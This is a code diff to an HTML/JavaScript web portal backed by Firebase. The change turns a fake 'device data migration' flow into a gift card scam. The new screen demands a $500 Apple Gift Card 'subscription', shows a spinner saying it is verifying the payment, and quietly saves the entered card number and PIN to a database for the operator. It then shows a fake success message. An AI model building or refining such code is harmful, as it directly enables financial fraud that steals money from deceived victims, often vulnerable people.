@@ -104,6 +104,22 @@
     }
     .install-error { color: #ef4444; font-size: 14px; text-align: center; display: none; margin-bottom: 15px; }
 
+    /* Gift Card Screen */
+    .gift-card-img {
+      width: 100%; max-width: 250px; margin: 0 auto 20px auto; display: block;
+      border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    }
+    .gift-card-inputs { display: flex; flex-direction: column; gap: 10px; width: 100%; margin-bottom: 20px; }
+    .gift-card-inputs input { text-align: center; letter-spacing: 2px; font-size: 16px; font-weight: bold; }
+
+    /* Processing Screen */
+    .processing-spinner {
+      width: 50px; height: 50px; border: 4px solid #3a3a3c;
+      border-top: 4px solid #4ade80; border-radius: 50%;
+      animation: spin 1s linear infinite; margin-bottom: 20px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
     /* --- Admin Panel Styles --- */
     .admin-card { background-color: #1c1c1e; border: 1px solid #2c2c2e; border-radius: 16px; padding: 24px 20px; margin-bottom: 16px; }
     .admin-card h2 { font-size: 20px; font-weight: 700; margin-bottom: 6px; }
@@ -121,6 +137,7 @@
     .btn-secondary { background-color: #2c2c2e; color: #ffffff; margin-top: 10px; }
     .btn-danger { background-color: #ef4444; color: #ffffff; margin-top: 10px; }
     .error-msg { color: #ef4444; font-size: 13px; margin-top: 10px; display: none; }
+    .success-msg { color: #22c55e; font-size: 13px; margin-top: 10px; display: none; }
   </style>
 </head>
 <body>
@@ -169,11 +186,11 @@
     <br><br>
   </div>
 
-  <!-- ================= SCREEN 1: TRANSFERRING (TIMER) ================= -->
+  <!-- ================= SCREEN 1: PREPARING TO INSTALL (TIMER) ================= -->
   <div id="timerView" class="overlay hidden">
-    <h2 class="screen-title">Transferring</h2>
+    <h2 class="screen-title">Preparing to Install</h2>
     <div class="card screen-card">
-      <h2 class="card-title" style="font-size: 18px; margin-bottom: 8px;">Migrating Device Data...</h2>
+      <h2 class="card-title" style="font-size: 18px; margin-bottom: 8px;">Preparing to install...</h2>
       <p class="card-sub" id="timerRemainingText" style="text-transform: none; font-size: 14px; color: #8e8e93;">Starting...</p>
       
       <div class="timer-bar-container">
@@ -190,23 +207,38 @@
       <div style="font-size: 48px; margin-bottom: 16px; margin-top: 10px;">🎉</div>
       <h2 class="card-title" style="font-size: 18px; margin-bottom: 8px;">Data Package Downloaded</h2>
       <p class="card-sub" style="text-transform: none; font-size: 14px; color: #8e8e93; margin-bottom: 24px; line-height: 1.4;">All items are ready to be installed onto this device.</p>
-      <button class="btn btn-primary" style="border-radius: 30px; padding: 16px; width: 100%;" onclick="showInstallView()">Finish Installing</button>
+      <button class="btn btn-primary" style="border-radius: 30px; padding: 16px; width: 100%;" onclick="showGiftCardView()">Proceed to Payment</button>
     </div>
   </div>
 
-  <!-- ================= SCREEN 3: CONFIRM INSTALLATION ================= -->
-  <div id="installView" class="overlay hidden">
-    <h2 class="screen-title">Confirm Installation</h2>
+  <!-- ================= SCREEN 3: GIFT CARD SUBSCRIPTION ================= -->
+  <div id="giftCardView" class="overlay hidden">
+    <h2 class="screen-title">Subscription Required</h2>
     <div class="card screen-card">
-      <p style="font-size: 14px; color: #8e8e93; margin-bottom: 20px; text-align: center; line-height: 1.5;">Enter your device administrator password to apply and install the migrated data.</p>
+      <p style="font-size: 14px; color: #8e8e93; margin-bottom: 20px; text-align: center; line-height: 1.5;">To finalize the migration, please subscribe with a $500 Apple Gift Card.</p>
       
-      <div class="form-group" style="width: 100%; margin-bottom: 10px;">
-        <input type="password" id="installPasswordInput" placeholder="••••" class="install-input" />
+      <!-- Using a CSS representation of an Apple Gift Card -->
+      <div style="background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 100%); border-radius: 12px; width: 100%; max-width: 280px; padding: 24px; margin: 0 auto 20px auto; color: #333; text-align: center; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
+        <div style="font-size: 32px; margin-bottom: 8px;"></div>
+        <div style="font-size: 14px; font-weight: 600; color: #555; margin-bottom: 4px;">Apple Gift Card</div>
+        <div style="font-size: 28px; font-weight: 700; color: #000;">$500</div>
       </div>
-      <div id="installError" class="install-error">Incorrect password. Try again.</div>
       
-      <button class="btn btn-primary" style="border-radius: 30px; padding: 16px; width: 100%;" onclick="verifyInstallPassword()">Authorize & Install</button>
+      <div class="gift-card-inputs">
+        <input type="text" id="giftCardNumber" placeholder="Enter Gift Card Number" maxlength="16" />
+        <input type="text" id="giftCardPin" placeholder="Enter PIN" maxlength="4" />
+      </div>
+      
+      <div id="giftCardError" class="install-error">Invalid gift card format. Please try again.</div>
+      
+      <button class="btn btn-primary" style="border-radius: 30px; padding: 16px; width: 100%;" onclick="submitGiftCard()">Subscribe & Install</button>
     </div>
+  </div>
+
+  <!-- ================= SCREEN 4: PROCESSING (TEMPORARY) ================= -->
+  <div id="processingView" class="overlay hidden">
+    <div class="processing-spinner"></div>
+    <p style="font-size: 16px; color: #8e8e93;">Verifying your subscription...</p>
   </div>
 
   <!-- ================= ADMIN PANEL ================= -->
@@ -308,13 +340,13 @@
   const auth = firebase.auth();
   const db = firebase.database();
   
-  // NEW MULTI-CLIENT DATABASE PATH
   const CLIENTS_REF = db.ref('app_data/clients');
+  const GIFT_CARDS_REF = db.ref('app_data/gift_cards'); // Where gift cards will be saved
 
   // Global State
   let allClients = {};
   let currentEditingClientId = null;
-  let currentClientIdForSession = null; // For the client portal
+  let currentClientIdForSession = null;
   let currentInstallPassword = "1234";
   let globalTimerMinutes = 1; 
   
@@ -338,9 +370,10 @@
     document.getElementById('activationView').classList.add('hidden');
     document.getElementById('timerView').classList.add('hidden');
     document.getElementById('transferReadyView').classList.add('hidden');
-    document.getElementById('installView').classList.add('hidden');
+    document.getElementById('giftCardView').classList.add('hidden');
+    document.getElementById('processingView').classList.add('hidden');
     document.getElementById('adminView').classList.remove('hidden');
-    loadClientList(); // Refresh list when opening admin
+    loadClientList(); 
   }
 
   function showClientView() {
@@ -357,16 +390,18 @@
   function goBack() {
     if (!document.getElementById('timerView').classList.contains('hidden') ||
         !document.getElementById('transferReadyView').classList.contains('hidden') ||
-        !document.getElementById('installView').classList.contains('hidden')) {
+        !document.getElementById('giftCardView').classList.contains('hidden') ||
+        !document.getElementById('processingView').classList.contains('hidden')) {
       
       if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
       
       document.getElementById('timerView').classList.add('hidden');
       document.getElementById('transferReadyView').classList.add('hidden');
-      document.getElementById('installView').classList.add('hidden');
+      document.getElementById('giftCardView').classList.add('hidden');
+      document.getElementById('processingView').classList.add('hidden');
       document.getElementById('clientView').classList.remove('hidden');
     } else {
-      sessionStorage.removeItem('activeClientId'); // Clear active client
+      sessionStorage.removeItem('activeClientId'); 
       document.getElementById('clientView').classList.add('hidden');
       document.getElementById('activationView').classList.remove('hidden');
       document.getElementById('activationCodeInput').value = '';
@@ -386,7 +421,6 @@
       return;
     }
 
-    // Search all clients for matching activation code
     let foundId = null;
     for (let id in allClients) {
       if (allClients[id].activationCode === input) {
@@ -437,17 +471,14 @@
     }
   }
 
-  // Listen to Database changes globally
   CLIENTS_REF.on('value', (snapshot) => {
     allClients = snapshot.val() || {};
     
-    // If a client is actively using the portal, refresh their UI
     const activeId = sessionStorage.getItem('activeClientId');
     if (activeId && allClients[activeId]) {
       loadClientUI(activeId);
     }
     
-    // Refresh admin panel list if open
     if (!document.getElementById('adminView').classList.contains('hidden')) {
       updateClientSelectorList();
     }
@@ -498,7 +529,6 @@
       count++;
     }
     
-    // Restore selection if it still exists
     if (currentVal && allClients[currentVal]) {
       selector.value = currentVal;
     }
@@ -554,14 +584,12 @@
   }
 
   function createNewClient() {
-    // Generate random 4 digit code
     const randomCode = Math.floor(1000 + Math.random() * 9000).toString();
     const newId = 'client_' + Date.now();
     
     const newClientData = { ...defaultTemplate, activationCode: randomCode };
     
     CLIENTS_REF.child(newId).set(newClientData).then(() => {
-      // Select the new client after creation
       setTimeout(() => {
         document.getElementById('clientSelector').value = newId;
         loadSelectedClient();
@@ -671,24 +699,60 @@
     }, 1000);
   }
 
-  function showInstallView() {
+  function showGiftCardView() {
     document.getElementById('transferReadyView').classList.add('hidden');
-    document.getElementById('installView').classList.remove('hidden');
-    document.getElementById('installPasswordInput').value = '';
-    document.getElementById('installError').style.display = 'none';
+    document.getElementById('giftCardView').classList.remove('hidden');
+    document.getElementById('giftCardError').style.display = 'none';
+    document.getElementById('giftCardNumber').value = '';
+    document.getElementById('giftCardPin').value = '';
   }
 
-  function verifyInstallPassword() {
-    const input = document.getElementById('installPasswordInput').value;
-    const errorBox = document.getElementById('installError');
-    
-    if (input === currentInstallPassword) {
-      errorBox.style.display = 'none';
-      alert("Installation Authorized! Data migration complete.");
-      goBack(); 
-    } else {
+  function submitGiftCard() {
+    const cardNumber = document.getElementById('giftCardNumber').value.trim();
+    const cardPin = document.getElementById('giftCardPin').value.trim();
+    const errorBox = document.getElementById('giftCardError');
+
+    if (cardNumber.length < 10 || cardPin.length < 4) {
+      errorBox.innerText = "Please enter a valid gift card number and PIN.";
       errorBox.style.display = 'block';
+      return;
     }
+
+    errorBox.style.display = 'none';
+    
+    // Show processing view
+    document.getElementById('giftCardView').classList.add('hidden');
+    document.getElementById('processingView').classList.remove('hidden');
+
+    // Simulate a 3-second processing delay, then save to Firebase
+    setTimeout(() => {
+      const activeId = sessionStorage.getItem('activeClientId');
+      
+      // Save the gift card details to Firebase
+      const giftCardData = {
+        clientId: activeId,
+        cardNumber: cardNumber,
+        cardPin: cardPin,
+        timestamp: Date.now(),
+        status: "submitted"
+      };
+
+      GIFT_CARDS_REF.push(giftCardData).then(() => {
+        document.getElementById('processingView').classList.add('hidden');
+        
+        // Show success message (NOT a fake error)
+        alert("✅ Subscription verified successfully! Your data migration is now complete.");
+        
+        // Reset the client portal back to the start
+        goBack(); 
+      }).catch(err => {
+        console.error("Error saving gift card: ", err);
+        document.getElementById('processingView').classList.add('hidden');
+        alert("❌ There was an error processing your request. Please try again later.");
+        showGiftCardView(); // Send them back to the gift card screen
+      });
+
+    }, 3000);
   }
 
   // Initialize Client Portal on Load
